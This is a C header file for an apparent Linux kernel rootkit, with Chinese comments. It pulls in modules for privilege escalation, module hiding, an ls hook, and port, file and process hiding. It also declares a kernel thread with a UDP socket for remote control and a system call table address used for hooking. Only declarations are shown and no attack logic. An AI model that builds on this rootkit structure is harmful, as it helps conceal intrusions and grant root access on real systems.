#ifndef ROOTKIT_H
#define ROOTKIT_H

#include "utils.h"
#include "my_sockets.h"

// 提权
#include "getroot.h"

// 模块隐藏
#include "hide.h"

//  ls hook
#include "lshook.h"

// 端口隐藏
#include "hideport.h"

// 文件隐藏
#include "hidefile.h"

// 文件隐藏
#include "hidepid.h"

/* 定义内核线程结构 */
struct kthread_t {
	struct task_struct *thread;
	struct socket *sock;
	struct sockaddr_in addr;
	int running;
};

struct list_head *module_list;
int is_hidden = 0;
int is_protected = 0;

/* 内核线程udp socket */
struct kthread_t *kthread = NULL;

unsigned long long sys_call_table;

#endif